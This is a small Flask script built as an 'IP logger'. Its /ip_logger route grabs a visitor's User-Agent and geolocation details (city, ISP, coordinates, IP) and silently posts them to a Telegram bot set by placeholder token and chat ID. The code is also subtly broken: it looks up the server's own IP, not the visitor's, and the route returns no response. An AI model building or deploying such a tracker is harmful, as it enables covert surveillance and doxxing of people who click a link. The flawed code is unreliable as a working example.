
from flask import Flask, request, redirect
import requests

app = Flask(__name__)
BOT_TOKEN = "ur token"
CHAT_ID ="chat_id"
def get_real_ip_data():
    try:
        response = requests.get("http://ip-api.com/json/")
        data = response.json()
        return data  
    except Exception:
        return {"query": "Unknown"} 

def send_to_telegram(ip_data, user_agent):
    message = f"""New IP Logged:

 Country: {ip_data.get("country", "Unknown")} ({ip_data.get("countryCode", "N/A")})
 Region: {ip_data.get("regionName", "Unknown")} - {ip_data.get("city", "Unknown")}
 Timezone: {ip_data.get("timezone", "Unknown")}
 ISP: {ip_data.get("isp", "Unknown")}
 AS: {ip_data.get("as", "Unknown")}
 Coordinates: {ip_data.get("lat", "N/A")}, {ip_data.get("lon", "N/A")}
 IP: {ip_data.get("query", "Unknown")}
 User-Agent: {user_agent}
    """

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": message})

@app.route('/ip_logger', methods=['GET'])
def log_ip():
    user_agent = request.headers.get('User-Agent', 'Unknown')
    ip_data = get_real_ip_data()  

    send_to_telegram(ip_data, user_agent)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
